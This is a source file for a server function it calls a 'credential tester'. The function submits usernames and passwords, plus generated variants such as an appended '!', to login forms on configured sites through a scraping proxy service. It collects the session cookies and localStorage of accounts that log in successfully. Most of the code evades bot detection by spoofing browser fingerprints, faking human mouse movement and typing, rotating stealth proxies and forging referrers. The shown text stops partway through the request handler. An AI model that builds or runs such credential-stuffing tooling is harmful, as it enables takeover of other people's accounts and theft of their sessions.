// ScrapingBee-based credential tester.
//
// Uses ScrapingBee's web scraping API (https://app.scrapingbee.com/api/v1)
// with `js_scenario` instructions to fill the login form and `json_response=true`
// to receive a structured report (status code, resolved_url, js_scenario_report,
// HTML body) that we use to decide working / failed / error.
//
// Docs followed exactly:
//   - https://www.scrapingbee.com/documentation/        (HTML API reference)
//   - https://www.scrapingbee.com/documentation/js-scenario/  (instructions)
//
// Important rules from those docs honored here:
//   • js_scenario MUST be a STRINGIFIED JSON object passed as a query param.
//   • The url query param MUST be URL-encoded — URLSearchParams handles this.
//   • Only documented instructions are used: fill, wait_for, click, wait.
//   • json_response=true returns { body, headers, cookies, resolved_url,
//       js_scenario_report: { tasks: [{ task, action, status, duration }], ... } }.
//   • premium_proxy / stealth_proxy / country_code / own_proxy / block_ads /
//     block_resources / wait / window_width / window_height / timeout / screenshot
//     are all valid documented params.
//   • country_code requires premium_proxy or stealth_proxy (we enforce this).
//   • timeout max is 140000 ms — we clamp.

import { createClientFromRequest } from 'npm:@base44/sdk@0.8.25';

const API_BASE = 'https://app.scrapingbee.com/api/v1/';

// Fire-and-forget log writer — never throws.
async function logEvent(base44, f) {
  try {
    await base44.asServiceRole.entities.ActionLog.create({
      level: f.level || 'info',
      category: f.category || 'system',
      message: String(f.message || '').slice(0, 2000),
      site: f.site || undefined,
      delta_ms: f.delta_ms || 0,
      session_id: f.session_id || undefined,
      timestamp: new Date().toISOString(),
    });
  } catch (_e) {}
}
const BLOCK_MARKERS = ['/blocked', '/error', '/access-denied', '/forbidden', '/captcha', '/challenge'];

// ------------ Settings / proxy resolution ------------
async function loadSettings(base44) {
  const rows = await base44.asServiceRole.entities.AppSettings.list('-created_date', 1);
  return rows[0] || {};
}

async function resolveProxy(base44, runProxy, settings) {
  const mode = runProxy?.proxy_mode || settings.proxy_mode || 'premium';
  const out = {
    mode,
    country_code: (runProxy?.country_code || settings.country_code || 'au').toLowerCase(),
    external: null,
  };
  if (mode === 'external') {
    const id = runProxy?.external_proxy_id || settings.external_proxy_id;
    if (id) {
      const rows = await base44.asServiceRole.entities.Proxy.filter({ id });
      const p = rows[0];
      if (p) out.external = p;
    }
  }
  return out;
}

// ------------ ScrapingBee request builder ------------
// Returns a fully-formed GET URL for ScrapingBee, with the js_scenario
// stringified per the docs.
function buildScrapingBeeUrl({ apiKey, targetUrl, jsScenario, settings, proxy, session, username }) {
  const params = new URLSearchParams();
  params.set('api_key', apiKey);
  params.set('url', targetUrl);
  params.set('render_js', 'true');
  params.set('json_response', 'true');
  params.set('js_scenario', JSON.stringify(jsScenario));

  if (session && session.cookies && Array.isArray(session.cookies)) {
    const cookieStr = session.cookies.map(c => `${c.name}=${c.value}`).join(';');
    params.set('cookies', cookieStr);
  }

  // Point 8: Sticky Proxy Sessions
  const safeSessionId = btoa(username || 'anon').replace(/[^a-zA-Z0-9]/g, '').slice(0, 30);
  params.set('session_id', safeSessionId);

  const isStealth = proxy.mode === 'stealth';

  if (proxy.mode === 'premium') {
    params.set('premium_proxy', 'true');
    if (proxy.country_code) params.set('country_code', proxy.country_code);
  } else if (proxy.mode === 'stealth') {
    params.set('stealth_proxy', 'true');
    if (proxy.country_code) params.set('country_code', proxy.country_code);
  } else if (proxy.mode === 'external' && proxy.external) {
    const { host, port, protocol, username, password } = proxy.external;
    if (host && port) {
      const scheme = protocol || 'http';
      const auth = username
        ? `${encodeURIComponent(username)}${password ? `:${encodeURIComponent(password)}` : ''}@`
        : '';
      params.set('own_proxy', `${scheme}://${auth}${host}:${port}`);
    }
  } else if (proxy.mode === 'none') {
    params.set('render_js', 'false');
    params.delete('js_scenario');
    params.delete('json_response');
  }

  if (settings.block_ads && !isStealth) params.set('block_ads', 'true');
  if (settings.block_resources === false || isStealth) {
    params.set('block_resources', 'false');
  }

  if (settings.wait_after_load_ms) {
    params.set('wait', String(Math.min(35000, Math.max(0, settings.wait_after_load_ms))));
  }
  
  // Point 5: Viewport Jitter
  const baseW = settings.viewport_width || 1920;
  const baseH = settings.viewport_height || 1080;
  const jitterW = baseW - 15 + Math.floor(Math.random() * 30);
  const jitterH = baseH - 15 + Math.floor(Math.random() * 30);
  params.set('window_width', String(jitterW));
  params.set('window_height', String(jitterH));

  if (settings.timeout_ms) {
    params.set('timeout', String(Math.min(140000, Math.max(1000, settings.timeout_ms))));
  }
  if (settings.capture_screenshots) params.set('screenshot', 'true');
  
  params.set('device', 'desktop');
  params.set('os', 'windows');

  params.set('forward_headers', 'true'); // Required for Referer and Accept-Language

  return `${API_BASE}?${params.toString()}`;
}

// ------------ js_scenario builder ------------
// Per docs, instructions are an ordered list executed sequentially.
// We use only the documented vocabulary: wait_for, fill, click, wait.
// strict:false so a stale wait_for on the success selector doesn't abort —
// we want the final HTML/URL even on failed logins so we can classify.
function buildLoginScenario(site, username, password, session, loginUrl) {
  const userSel = site.username_selector || "input[type='email'], input[name='username']";
  const passSel = site.password_selector || "input[type='password']";
  const submitSel = site.submit_selector || "button[type='submit']";
  const baseWaitMs = Math.min(20000, Math.max(0, site.wait_after_submit_ms || 3500));

  const randomize = (ms) => {
    const variance = ms * 0.3;
    return Math.floor(ms - variance + Math.random() * (variance * 2));
  };

  const instructions = [];

  // Point 6: Advanced Fingerprint Spoofing
  const spoofScript = `
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => Math.floor(Math.random() * 4 + 4) * 2 });
    Object.defineProperty(document, 'referrer', { get: () => 'https://www.google.com/' });

    navigator.getBattery = async () => ({
        level: 0.40 + Math.random() * 0.45,
        charging: false,
        chargingTime: Infinity,
        dischargingTime: 8000,
        addEventListener: () => {}
    });

    Object.defineProperty(navigator, 'connection', {
      get: () => ({ rtt: 50, downlink: 10, effectiveType: '4g', saveData: false })
    });

    const OriginalDateTimeFormat = Intl.DateTimeFormat;
    Intl.DateTimeFormat = function(...args) {
        if (!args[1]) args[1] = {};
        if (!args[1].timeZone) args[1].timeZone = 'Australia/Brisbane';
        return new OriginalDateTimeFormat(...args);
    };

    if (window.WebGLRenderingContext) {
      const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
      WebGLRenderingContext.prototype.getParameter = function(parameter) {
        if (parameter === 37445) return 'Intel Inc.';
        if (parameter === 37446) return 'Intel Iris OpenGL Engine';
        return originalGetParameter.apply(this, arguments);
      };
    }

    const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
    HTMLCanvasElement.prototype.toDataURL = function() {
        const ctx = this.getContext('2d');
        if (ctx && this.width > 0 && this.height > 0) {
            ctx.fillStyle = \\\`rgba(\${Math.floor(Math.random() * 255)}, \${Math.floor(Math.random() * 255)}, \${Math.floor(Math.random() * 255)}, 0.01)\\\`;
            ctx.fillRect(0, 0, this.width, this.height);
        }
        return originalToDataURL.apply(this, arguments);
    };

    const AC = window.AudioContext || window.webkitAudioContext;
    if (AC) {
      const originalGetChannelData = AudioBuffer.prototype.getChannelData;
      AudioBuffer.prototype.getChannelData = function() {
        const results = originalGetChannelData.apply(this, arguments);
        for (let i = 0; i < results.length; i+=100) results[i] = results[i] + (Math.random() * 0.0000001);
        return results;
      };
    }
  `;
  instructions.push({ evaluate: spoofScript });

  if (session && session.restore) {
    if (session.local_storage) {
      instructions.push({ evaluate: `try { const ls = ${session.local_storage}; for(let k in ls) window.localStorage.setItem(k, ls[k]); } catch(e) {}` });
      instructions.push({ evaluate: `window.location.reload();` });
    }
  } else {
    // PRE-FLIGHT
    // Point 2: Randomized Scrolling Behavior
    const scrollScript = `
      let scrollY = 0;
      const scrollStep = () => {
        scrollY += Math.random() * 100 + 50;
        window.scrollTo({ top: scrollY, behavior: 'smooth' });
      };
      scrollStep(); setTimeout(scrollStep, 500); setTimeout(scrollStep, 1200);
    `;
    instructions.push({ wait: randomize(1000) });
    instructions.push({ evaluate: scrollScript });
    instructions.push({ wait: randomize(2000) }); 

    instructions.push({ evaluate: `window.location.href = "${loginUrl}";` });
    instructions.push({ wait: randomize(2500) }); // Wait for navigation

    instructions.push({ wait_for: userSel });

    const loginScrollScript = `
      window.scrollTo({ top: Math.random() * 200 + 100, behavior: 'smooth' });
      setTimeout(() => window.scrollTo({ top: 0, behavior: 'smooth' }), 800 + Math.random() * 500);
    `;
    instructions.push({ evaluate: loginScrollScript });
    instructions.push({ wait: randomize(1500) });
    
    // Points 1, 3, 9: Bezier Mouse, Human Typing, Visibility Spoofing
    const synthEvents = `
      window.bezierCurve = function(t, p0, p1, p2, p3) {
        const cX = 3 * (p1.x - p0.x), bX = 3 * (p2.x - p1.x) - cX, aX = p3.x - p0.x - cX - bX;
        const cY = 3 * (p1.y - p0.y), bY = 3 * (p2.y - p1.y) - cY, aY = p3.y - p0.y - cY - bY;
        const x = (aX * Math.pow(t, 3)) + (bX * Math.pow(t, 2)) + (cX * t) + p0.x;
        const y = (aY * Math.pow(t, 3)) + (bY * Math.pow(t, 2)) + (cY * t) + p0.y;
        return { x, y };
      };
      window.simMouseAndFocus = async function(sel) {
        const el = document.querySelector(sel);
        if(!el) return;
        const rect = el.getBoundingClientRect();
        const target = { x: rect.left + rect.width / 2, y: rect.top + rect.height / 2 };
        const start = { x: Math.random() * window.innerWidth, y: Math.random() * window.innerHeight };
        const cp1 = { x: start.x + (Math.random() * 100 - 50), y: start.y + (Math.random() * 100 - 50) };
        const cp2 = { x: target.x + (Math.random() * 100 - 50), y: target.y + (Math.random() * 100 - 50) };
        
        for (let i = 0; i <= 10; i++) {
          const pt = window.bezierCurve(i / 10, start, cp1, cp2, target);
          document.dispatchEvent(new MouseEvent('mousemove', { clientX: pt.x, clientY: pt.y, bubbles: true }));
          await new Promise(r => setTimeout(r, 20 + Math.random() * 20));
        }
        
        el.dispatchEvent(new PointerEvent('pointerdown', { bubbles: true, pointerType: 'mouse' }));
        el.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }));
        el.focus();
        el.dispatchEvent(new PointerEvent('pointerup', { bubbles: true, pointerType: 'mouse' }));
        el.dispatchEvent(new MouseEvent('mouseup', { bubbles: true }));
        el.dispatchEvent(new MouseEvent('click', { bubbles: true }));
      };
      window.humanType = async function(sel, text) {
        const el = document.querySelector(sel);
        if(!el) return;
        el.value = '';
        for(let i=0; i<text.length; i++) {
          if (Math.random() < 0.05 && i > 0) {
             const wrong = String.fromCharCode(text.charCodeAt(i) + 1);
             el.value += wrong;
             el.dispatchEvent(new Event('input', {bubbles: true}));
             await new Promise(r => setTimeout(r, 100 + Math.random() * 150));
             el.value = el.value.slice(0, -1);
             el.dispatchEvent(new Event('input', {bubbles: true}));
             await new Promise(r => setTimeout(r, 100 + Math.random() * 150));
          }
          el.value += text[i];
          el.dispatchEvent(new Event('input', {bubbles: true}));
          await new Promise(r => setTimeout(r, 50 + Math.random() * 100));
        }
        el.dispatchEvent(new Event('change', {bubbles: true}));
      };
      window.spoofVisibility = function() {
        Object.defineProperty(document, 'visibilityState', { get: () => 'hidden', configurable: true });
        document.dispatchEvent(new Event('visibilitychange'));
        setTimeout(() => {
          Object.defineProperty(document, 'visibilityState', { get: () => 'visible', configurable: true });
          document.dispatchEvent(new Event('visibilitychange'));
        }, 1500);
      };
    `;

    instructions.push({ evaluate: synthEvents });
    instructions.push({ evaluate: `return window.simMouseAndFocus("${userSel}");` });
    instructions.push({ wait: randomize(200) });
    instructions.push({ evaluate: `return window.humanType("${userSel}", \`${username}\`);` });
    
    instructions.push({ wait: randomize(400) });
    instructions.push({ evaluate: `window.spoofVisibility();` });
    instructions.push({ wait: randomize(2000) });

    instructions.push({ evaluate: `return window.simMouseAndFocus("${passSel}");` });
    instructions.push({ wait: randomize(200) });
    instructions.push({ evaluate: `return window.humanType("${passSel}", \`${password}\`);` });
    
    instructions.push({ wait: randomize(600) });
    instructions.push({ evaluate: `return window.simMouseAndFocus("${submitSel}");` });
    instructions.push({ wait: randomize(300) });
    instructions.push({ click: submitSel });
  }
  
  instructions.push({ wait: randomize(baseWaitMs) });
  instructions.push({ evaluate: "return JSON.stringify(window.localStorage || {});" });

  return { strict: false, instructions };
}

// ------------ Result classification ------------
// ScrapingBee's json_response gives us: resolved_url (final URL after redirects),
// body (final HTML), and js_scenario_report.tasks[] (status per instruction).
// We use these three to decide working / failed / error.
function classify(site, sbJson) {
  const resolvedUrl = sbJson.resolved_url || sbJson.initial_status_code_url || '';
  const body = sbJson.body || '';
  const report = sbJson.js_scenario_report || {};
  const tasksArray = Array.isArray(report.tasks) ? report.tasks : [];
  const tasksString = tasksArray.map((t) => `${t.action}:${t.status}(${Math.round(t.time || t.duration || 0)}ms)`).join(' | ');

  const preSubmitFail = tasksArray.find(
    (t) => t.status && t.status !== 'success' && (t.action === 'wait_for' || t.action === 'fill')
  );
  if (preSubmitFail) {
    const which = preSubmitFail.action === 'wait_for' ? 'username field not found' : 'fill failed';
    return { status: 'error', error: `${which}: ${preSubmitFail.task || ''}`.trim(), tasks_string: tasksString };
  }

  const lower = (resolvedUrl || '').toLowerCase();
  const blocked = BLOCK_MARKERS.some((m) => lower.includes(m));
  const loginMarker = (site.login_url_marker || '/login').toLowerCase();
  const stayedLogin = loginMarker ? lower.includes(loginMarker) : false;
  const successUrl = site.success_url_contains
    ? lower.includes(site.success_url_contains.toLowerCase())
    : false;

  const successSel = site.success_selector || '';
  let markerFound = false;
  if (successSel && body) {
    const tokens = [];
    successSel.split(/[\s,>+~]+/).forEach((part) => {
      const idMatch = part.match(/#([\w-]+)/);
      if (idMatch) tokens.push({ kind: 'id', val: idMatch[1] });
      const classMatches = part.match(/\.([\w-]+)/g) || [];
      classMatches.forEach((c) => tokens.push({ kind: 'class', val: c.slice(1) }));
    });
    if (tokens.length > 0) {
      markerFound = tokens.every((t) => {
        if (t.kind === 'id') return body.includes(`id="${t.val}"`) || body.includes(`id='${t.val}'`);
        return new RegExp(`class=["'][^"']*\\b${t.val}\\b`, 'i').test(body);
      });
    }
  }

  let ls = "{}";
  const evalTask = tasksArray.slice().reverse().find(t => t.action === 'evaluate' && t.result);
  if (evalTask) {
    ls = evalTask.result;
  }

  const lowerBody = body.toLowerCase();
  const permDisabled = lowerBody.includes('been disabled');
  const tempDisabled = lowerBody.includes('temporarily disabled');

  if (permDisabled) return { status: 'permdisabled', final_url: resolvedUrl, marker: false, tasks_string: tasksString };
  if (tempDisabled) return { status: 'tempdisabled', final_url: resolvedUrl, marker: false, tasks_string: tasksString };

  if (markerFound || successUrl) {
    return { status: 'working', final_url: resolvedUrl, marker: markerFound, tasks_string: tasksString, session_cookies: sbJson.cookies || [], session_local_storage: ls };
  }
  if (site.lenient_success && !stayedLogin && !blocked) {
    return { status: 'working', final_url: resolvedUrl, marker: false, tasks_string: tasksString, session_cookies: sbJson.cookies || [], session_local_storage: ls };
  }
  return { status: 'failed', final_url: resolvedUrl, marker: false, tasks_string: tasksString };
}

// Strip the api_key from a ScrapingBee URL so it's safe to log.
function redactUrl(url) {
  try { return url.replace(/(api_key=)[^&]+/, '$1***'); } catch { return '[redacted]'; }
}

// ------------ Single password attempt ------------
async function runOne(apiKey, settings, proxy, site, loginUrl, username, password, base44, site_key, sessionToRestore) {
  if (proxy.mode === 'premium' || proxy.mode === 'stealth') {
    // country_code REQUIRES premium or stealth — we already only set it in
    // those branches in the URL builder, so this is just a guard.
  } else if ((proxy.mode === 'classic' || proxy.mode === 'none' || proxy.mode === 'external') && proxy.country_code) {
    // country_code is silently ignored by ScrapingBee on non-premium tiers;
    // documented behavior, no action needed.
  }

  let targetUrl = loginUrl;
  if (!sessionToRestore?.restore) {
    try {
      const urlObj = new URL(loginUrl);
      targetUrl = urlObj.origin + '/'; // Neutral page (homepage)
    } catch(e) {}
  }

  const url = buildScrapingBeeUrl({
    apiKey,
    targetUrl: targetUrl,
    jsScenario: buildLoginScenario(site, username, password, sessionToRestore, loginUrl),
    settings,
    proxy,
    session: sessionToRestore,
    username: username,
  });

  // Stream the literal outbound URL into the live terminal (api_key redacted).
  logEvent(base44, {
    level: 'debug', category: 'network', site: site_key,
    message: `→ ScrapingBee · ${redactUrl(url).slice(0, 1500)}`,
  });

  const started = Date.now();
  const isStealth = proxy.mode === 'stealth';
  
  // Enforce modern Chrome UA to bypass anti-bot, resolving OS/UA contradiction
  const modernChromeUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36';
  
  // Point 4: Geographic Headers
  const geoMap = {
    'au': { lang: 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7' },
    'us': { lang: 'en-US,en;q=0.9' },
    'gb': { lang: 'en-GB,en-US;q=0.9,en;q=0.8' },
    'ca': { lang: 'en-CA,en-US;q=0.9,en;q=0.8' },
    'nz': { lang: 'en-NZ,en-GB;q=0.9,en-US;q=0.8,en;q=0.7' }
  };
  const geoInfo = geoMap[(proxy.country_code || 'au').toLowerCase()] || geoMap['au'];

  let headers = {
    'Accept-Language': geoInfo.lang,
    // Point 10: Dynamic Referrer
    'Referer': 'https://www.google.com/search?q=' + encodeURIComponent(site.label || site_key)
  };
  
  if (settings.user_agent && !isStealth) {
    headers['User-Agent'] = settings.user_agent;
  } else if (isStealth) {
    headers['User-Agent'] = modernChromeUA;
  }

  const res = await fetch(url, { method: 'GET', headers });
  const elapsed = Date.now() - started;

  if (!res.ok) {
    const text = await res.text();
    logEvent(base44, {
      level: 'error', category: 'network', site: site_key, delta_ms: elapsed,
      message: `← ScrapingBee ${res.status} · ${text.slice(0, 300)}`,
    });
    return { status: 'error', error: `ScrapingBee ${res.status}: ${text.slice(0, 300)}`, elapsed };
  }

  // With json_response=true the response body is JSON, not the page HTML.
  let json;
  try {
    json = await res.json();
  } catch (e) {
    return { status: 'error', error: `ScrapingBee non-JSON response: ${e.message}`, elapsed };
  }

  const verdict = classify(site, json);
  // Compact verdict log — final URL, task statuses, screenshot flag. The full
  // HTML body is intentionally omitted (it's huge and contains the page DOM).
  const tasksString = verdict.tasks_string || '';
  
  logEvent(base44, {
    level: verdict.status === 'working' ? 'success' : verdict.status === 'error' ? 'error' : 'warn',
    category: 'network', site: site_key, delta_ms: elapsed,
    message: `← ScrapingBee ${res.status} · ${verdict.status} · ${json.resolved_url || '(no url)'} · [${tasksString}]${json.screenshot ? ' · shot' : ''}`,
  });
  
  if (verdict.status === 'error' || verdict.status === 'failed') {
    logEvent(base44, {
      level: 'debug',
      category: 'network', site: site_key, delta_ms: elapsed,
      message: `Detailed ScrapingBee JS Scenario Report:\n${JSON.stringify(json.js_scenario_report || {}, null, 2)}`
    });
  }

  return { 
    ...verdict, 
    elapsed, 
    screenshot_b64: json.screenshot || null, 
    tasks_string: tasksString,
    session_cookies: verdict.session_cookies,
    session_local_storage: verdict.session_local_storage,
  };
}

// Upload a base64 screenshot returned by ScrapingBee (json.screenshot) and
// return a public file URL. Returns null on any failure — screenshots are
// best-effort, never block the test result.
async function uploadScreenshot(base44, b64, site_key, username) {
  try {
    if (!b64) return null;
    // ScrapingBee returns raw base64 (no data: prefix). Decode → Blob → upload.
    const binary = atob(b64);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
    const blob = new Blob([bytes], { type: 'image/png' });
    const safeUser = (username || 'user').replace(/[^a-z0-9]+/gi, '_').slice(0, 40);
    const file = new File([blob], `${site_key}-${safeUser}-${Date.now()}.png`, { type: 'image/png' });
    const res = await base44.integrations.Core.UploadFile({ file });
    return res?.file_url || null;
  } catch (_e) {
    return null;
  }
}

// ------------ Per-site test (handles password strategy) ------------
async function testSite(apiKey, settings, proxy, site, loginUrl, username, passwords, strategy, base44, sessionToRestore) {
  let list = [passwords[0]];
  // If we are restoring session, only do 1 attempt (skip pass tests)
  if (sessionToRestore && sessionToRestore.restore) {
    list = [passwords[0]];
  } else if (strategy !== 'single') {
    if (passwords.length > 1) {
      const p1 = passwords[0], p2 = passwords[1] || p1, p3 = passwords[2] || p2;
      list = [p1, p2, p3, p3];
    } else {
      const p1 = passwords[0];
      list = [p1, p1 + '!', p1 + '!!', p1 + '!!'];
    }
  }

  let lastFailed = null;
  let lastError = null;
  let totalElapsed = 0;
  let lastScreenshot = null;

  for (let i = 0; i < list.length; i++) {
    const pw = list[i];
    const r = await runOne(apiKey, settings, proxy, site, loginUrl, username, pw, base44, site.key, sessionToRestore);
    totalElapsed += r.elapsed || 0;
    if (r.screenshot_b64) lastScreenshot = r.screenshot_b64;

    if (r.status === 'working') {
      return {
        site_key: site.key,
        status: 'working',
        final_url: r.final_url,
        success_marker_found: !!r.marker,
        working_password: pw,
        elapsed_ms: totalElapsed,
        screenshot_b64: r.screenshot_b64 || null,
        session_cookies: r.session_cookies,
        session_local_storage: r.session_local_storage,
      };
    }
    if (r.status === 'tempdisabled' || r.status === 'permdisabled') {
      return {
        site_key: site.key,
        status: r.status,
        final_url: r.final_url,
        success_marker_found: false,
        elapsed_ms: totalElapsed,
        screenshot_b64: lastScreenshot,
        error_message: r.status === 'tempdisabled' ? 'Temporarily disabled (1hr cooldown)' : 'Permanently disabled'
      };
    }
    if (r.status === 'error') {
      lastError = r.error || 'unknown error';
      if (r.tasks_string && !lastError.includes('Steps:')) {
        lastError += `\nSteps: ${r.tasks_string}`;
      }
      if (strategy === 'single') break;
      continue;
    }
    lastFailed = r;
    if (strategy === 'multi_password') continue;
  }

  if (lastFailed) {
    return {
      site_key: site.key,
      status: 'noaccount',
      final_url: lastFailed.final_url,
      success_marker_found: false,
      elapsed_ms: totalElapsed,
      screenshot_b64: lastScreenshot,
      error_message: lastFailed.tasks_string ? `No account (4 attempts failed)\nSteps: ${lastFailed.tasks_string}` : 'No account (4 attempts failed)',
    };
  }
  return {
    site_key: site.key,
    status: 'error',
    error_message: lastError || 'unknown error',
    elapsed_ms: totalElapsed,
    screenshot_b64: lastScreenshot,
  };
}

// ------------ Aggregator-site combine ------------
function combine(perSite) {
  const anyWorking = perSite.find((r) => r.status === 'working');
  if (anyWorking) return {
    status: 'working',
    final_url: anyWorking.final_url,
    success_marker_found: true,
    working_password: anyWorking.working_password,
    elapsed_ms: perSite.reduce((a, b) => a + (b.elapsed_ms || 0), 0),
    session_cookies: anyWorking.session_cookies,
    session_local_storage: anyWorking.session_local_storage,
    per_site: perSite,
  };

  const anyPermDisabled = perSite.find((r) => r.status === 'permdisabled');
  if (anyPermDisabled) return { ...anyPermDisabled, per_site: perSite };

  const anyTempDisabled = perSite.find((r) => r.status === 'tempdisabled');
  if (anyTempDisabled) return { ...anyTempDisabled, per_site: perSite };

  const anyNoAccount = perSite.find((r) => r.status === 'noaccount');
  if (anyNoAccount) return { ...anyNoAccount, per_site: perSite };

  const anyFailed = perSite.find((r) => r.status === 'failed');
  if (anyFailed) return {
    status: 'failed',
    final_url: anyFailed.final_url,
    success_marker_found: false,
    error_message: anyFailed.error_message || undefined,
    elapsed_ms: perSite.reduce((a, b) => a + (b.elapsed_ms || 0), 0),
    per_site: perSite,
  };

  return {
    status: 'error',
    error_message: perSite.map((r) => `${r.site_key}: ${r.error_message || 'unknown'}`).join(' | '),
    elapsed_ms: perSite.reduce((a, b) => a + (b.elapsed_ms || 0), 0),
    per_site: perSite,
  };
}

// ------------ HTTP entrypoint ------------
Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    let user = null;
    try { user = await base44.auth.me(); } catch (_) {}

    const body = await req.json().catch(() => ({}));
    const settings = await loadSettings(base44);
    const apiKey = settings.scrapingbee_api_key || Deno.env.get('SCRAPINGBEE_API_KEY');
    if (!apiKey) return Response.json({ error: 'SCRAPINGBEE_API_KEY not set' }, { status: 500 });
    
    if (body._secret !== apiKey && (!user || user.role !== 'admin')) {
      return Response.json({ error: 'Unauthorized' }, { status: 401 });
    }
    
    const {
      username, password, extra_passwords, site_key,
      target_site_keys, custom_url,
      proxy: runProxy, strategy: runStrategy,
      session_cookies, session_local_storage, restore_session
    } = body;
    
    const sessionToRestore = restore_session ? {
      restore: true,
      cookies: session_cookies,
      local_storage: session_local_storage
    } : undefined;

    if (!username || !password || !site_key) {
      return Response.json({ error: 'Missing username/password/site_key' }, { status: 400 });
    }
    const strategy = runStrategy || settings.default_login_strategy || 'multi_password';

    // Build deduped password list.
    const passwords = [password];
    if (Array.isArray(extra_passwords)) {
      for (const p of extra_passwords) if (p && !passwords.includes(p)) passwords.push(p);
    }

    const sites = await base44.asServiceRole.entities.Site.filter({ key: site_key });
    const site = sites[0];
    if (!site) return Response.json({ error: `Unknown site: ${site_key}` }, { status: 404 });

    // Resolve test targets (primary + secondaries, or override).
    const testSites = [];
    if (Array.isArray(target_site_keys) && target_site_keys.length > 0) {
      const found = await Promise.all(
        target_site_keys.map((k) => base44.asServiceRole.entities.Site.filter({ key: k }))
      );
      for (const f of found) if (f[0]) testSites.push(f[0]);
    } else {
      if (!site.skip_primary && site.login_url) testSites.push(site);
      const keys = site.secondary_site_keys || [];
      if (keys.length > 0) {
        const found = await Promise.all(
          keys.map((k) => base44.asServiceRole.entities.Site.filter({ key: k }))
        );
        for (const f of found) if (f[0]) testSites.push(f[0]);
      }
    }
    if (testSites.length === 0) {
      return Response.json({ status: 'error', error_message: `No testable sites for ${site_key}` });
    }

    const proxy = await resolveProxy(base44, runProxy, settings);

    logEvent(base44, {
      level: 'info', category: 'auth', site: site_key,
      message: `Test start · ${username} · ${testSites.map((s) => s.key).join('+')} · proxy=${proxy.mode}/${proxy.country_code} · pwd=${passwords.length} · strat=${strategy}`,
    });

    let finalResults = [];
    let useLegacy = false;

    if (settings.v8_logic_enabled !== false) {
      try {
        logEvent(base44, { level: 'info', category: 'system', site: site_key, message: 'Initiating V8 advanced logic (multi-site parallel testing, stealth proxy)' });
        
        let list = [passwords[0]];
        if (strategy !== 'single') {
          if (passwords.length > 1) {
            const p1 = passwords[0], p2 = passwords[1] || p1, p3 = passwords[2] || p2;
            list = [p1, p2, p3, p3];
          } else {
            const p1 = passwords[0];
            list = [p1, p1 + '!', p1 + '!!', p1 + '!!'];
          }
        }
        const statusMap = {};
        for (const s of testSites) statusMap[s.key] = { site_key: s.key, elapsed_ms: 0 };
        
        let earlyStop = false;
        const v8Settings = { ...settings };
        const v8Proxy = { ...proxy, mode: 'stealth' }; // V8 enforces stealth proxy

        for (const pw of list) {
          if (earlyStop) break;

          const attemptPromises = testSites.map(async (s) => {
            if (statusMap[s.key].status === 'working') return null; // Already succeeded
            const loginUrl = custom_url || s.login_url;
            if (!loginUrl) return { _site: s, site_key: s.key, status: 'error', error_message: 'No login_url' };
            
            const r = await runOne(apiKey, v8Settings, v8Proxy, s, loginUrl, username, pw, base44, s.key, sessionToRestore);
            return { _site: s, ...r };
          });

          const attemptResults = await Promise.all(attemptPromises);

          for (const r of attemptResults) {
            if (!r) continue; // skipped
            const sk = r.site_key || r._site.key;
            statusMap[sk].elapsed_ms += (r.elapsed || 0);
            statusMap[sk].screenshot_b64 = r.screenshot_b64 || statusMap[sk].screenshot_b64;

            if (r.status === 'working') {
              statusMap[sk].status = 'working';
              statusMap[sk].final_url = r.final_url;
              statusMap[sk].success_marker_found = !!r.marker;
              statusMap[sk].working_password = pw;
              statusMap[sk].session_cookies = r.session_cookies;
              statusMap[sk].session_local_storage = r.session_local_storage;
              earlyStop = true; // Burn rule
            } else if (r.status === 'tempdisabled' || r.status === 'permdisabled') {
              logEvent(base44, { level: 'warn', category: 'auth', site: sk, message: `${r.status} message detected. Early stopping V8 logic.` });
              statusMap[sk].status = r.status;
              statusMap[sk].final_url = r.final_url;
              statusMap[sk].success_marker_found = false;
              statusMap[sk].error_message = r.status === 'tempdisabled' ? 'Temporarily disabled (1hr cooldown)' : 'Permanently disabled';
              earlyStop = true; // Early stop rule
            } else if (r.status === 'error') {
              statusMap[sk].status = 'error';
              statusMap[sk].error_message = r.error || 'unknown error';
              if (r.tasks_string && !statusMap[sk].error_message.includes('Steps:')) {
                statusMap[sk].error_message += `\nSteps: ${r.tasks_string}`;
              }
            } else {
              statusMap[sk].status = 'noaccount';
              statusMap[sk].final_url = r.final_url;
              statusMap[sk].success_marker_found = false;
              statusMap[sk].error_message = r.tasks_string ? `No account (4 attempts failed)\nSteps: ${r.tasks_string}` : 'No account (4 attempts failed)';
            }
          }

          if (strategy === 'multi_password' && attemptResults.some(r => r && r.status === 'working')) {
            break;
          }
        }
        
        finalResults = testSites.map(s => {
          const r = statusMap[s.key];
          if (!r.status) r.status = 'failed'; // default if untouched
          return r;
        });

      } catch (err) {
        logEvent(base44, { level: 'error', category: 'system', site: site_key, message: `V8 advanced logic failed, falling back to legacy: ${err.message}` });
        useLegacy = true;
      }
    } else {
      useLegacy = true;
    }

    if (useLegacy) {
      finalResults = await Promise.all(testSites.map(async (s) => {
        const loginUrl = custom_url || s.login_url;
        if (!loginUrl) {
          return { site_key: s.key, status: 'error', error_message: 'No login_url', elapsed_ms: 0 };
        }
        const r = await testSite(apiKey, settings, proxy, s, loginUrl, username, passwords, strategy, base44, sessionToRestore);
        logEvent(base44, {
          level: r.status === 'working' ? 'success' : r.status === 'error' ? 'error' : 'warn',
          category: 'auth', site: s.key, delta_ms: r.elapsed_ms || 0,
          message: `[Legacy] ${username} → ${r.status}${r.final_url ? ' · ' + r.final_url : ''}${r.error_message ? ' · ' + r.error_message : ''}`,
        });
        return r;
      }));
    }

    // Upload screenshots in parallel (best-effort, never blocks). We pick the
    // first non-null b64 across all per-site results — there's only ever one
    // ScrapingBee request per site so at most one screenshot per site anyway.
    const screenshotB64 = finalResults.find((r) => r.screenshot_b64)?.screenshot_b64 || null;
    const screenshotUrl = screenshotB64
      ? await uploadScreenshot(base44, screenshotB64, site_key, username)
      : null;

